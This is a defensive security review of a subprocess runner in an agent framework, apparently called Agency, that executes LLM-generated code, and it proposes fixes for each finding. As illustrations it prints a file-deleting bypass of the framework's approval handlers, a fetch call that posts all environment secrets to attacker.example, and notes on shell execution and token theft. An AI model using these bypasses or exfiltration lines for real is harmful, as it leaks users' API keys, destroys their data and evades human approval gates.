S6. No resource limits on the subprocess

A bug or malicious script can:
- Allocate gigabytes (no --max-old-space-size)
- Spin in while (true) {} forever (no CPU cap; no walltime)
- Open unlimited file handles
- Fork-bomb via direct child_process.spawn (no ulimit)

There's no timeout parameter on run() (spec called for one), no AbortSignal integration with the parent's cancellation system (spec called for that too), and no child.kill() trigger on the parent's lifecycle. A subprocess that hangs leaves the parent's _run Promise unresolved indefinitely.

Fix: add a timeout option to run(). Wire child.kill("SIGKILL") on parent abort. Optionally pass --max-old-space-size=... via Node flags when spawning.

---

This is the biggest issue. The whole "handlers gate destructive actions" story only holds for code that funnels through Agency's interrupt() mechanism. Direct Node APIs are unguarded.

A trivial bypass:

// agent-generated source passed to compile()
import * as fs from "fs"

node main() {
  fs.unlinkSync("/Users/victim/important.txt")
  return "deleted"
}

compile() happily compiles this (Agency's import resolution allows npm packages). The compiled JS lands in .agency-tmp/<id>/x.js and is import()ed by the bootstrap. The unlinkSync runs — no interrupt, no handler, nothing.

The same applies to:
- import { execSync } from "child_process" → arbitrary shell execution
- import * as net from "net" → arbitrary network
- import * as os from "os" / process.env → secret read
- process.kill(...) → kill the parent
- process.exit(0) before process.send of result → makes parent's close handler fire (mostly harmless; demonstrates flow control bypass)

The spec acknowledges this implicitly ("Only stdlib std:: and npm package imports are allowed") but apparently considered npm imports safe. They aren't — fs and child_process are npm-resolvable from the subprocess.

Fix options (in increasing strength):
1. AST-level allowlist: parse generated source, reject any non-std:: import. Crude but stops the obvious case.
2. Runtime allowlist: pass a restricted --experimental-vm-modules loader that fails imports outside an allowed list.
3. True sandbox: run the subprocess in a Node vm, in isolated-vm, as an unprivileged user, or in a container.

---

S5. Full process.env is forwarded to untrusted subprocess

env: { ...process.env, AGENCY_IPC: "1" }

The spec is explicit that this is intentional ("including API keys (OPENAI_API_KEY, etc.)"). For the threat model "I'm running my own well-behaved subprocess code", that's fine. For the threat model "an LLM wrote this code, possibly steered by adversarial user input", it isn't:

- OPENAI_API_KEY, ANTHROPIC_API_KEY, BRAVE_API_KEY, MCP MCP_*_CLIENT_SECRET — all leak.
- The subprocess can fetch("https://attacker.example/", { method: "POST", body: JSON.stringify(process.env) }) (using direct fetch from Node 18+, no Agency wrapper, no handler).
- For OAuth-using MCP servers, tokens are at ~/.agency/tokens/<name>.json — the subprocess can read them directly.

Fix: filter env to a small allowlist (e.g., PATH, HOME, USER, plus AI provider keys only if the subprocess actually needs them). Pass an explicit env parameter to run() for the subprocess, defaulting to nothing or just PATH.

This conflicts with usability — the subprocess won't be able to make LLM calls without a key. The right answer is probably: subprocess gets keys only when the parent passes them explicitly via the args object, and the parent's handler can decide whether to allow it.

---

S8. Unbounded IPC payload size

The bootstrap sends {type: "result", value: {data, tokens, messages}}. Nothing caps the size of any field. A subprocess that returns a 2 GB string causes the parent to allocate a 2 GB string in msg.value.data. Same for thread message history.

Node's IPC channel uses JSON serialization with no inherent size limit beyond V8's heap. Easy DoS.

Fix: cap payload size at a configurable limit (e.g., 10 MB by default), reject the result with a failure if exceeded.

---

S7. AGENCY_IPC=1 leaks to grandchildren

Already noted in the regular review — security implication is that any code running in the subprocess (e.g., bash shelling out) inherits this env. If those grandchildren run anything that reads AGENCY_IPC, they'll have stale isIpcMode truth without a real channel and may misbehave (throw, hang, or — worst case — interpret the env as "skip safety checks"). Since sendInterruptToParent throws on missing process.send, the user-visible failure is at least loud rather than silent. Still, fix isIpcMode() to also check typeof process.send === "function".

---

how to expose pid of child process for debugging?

--

Is there any way to support this behavior when running agency in the browser?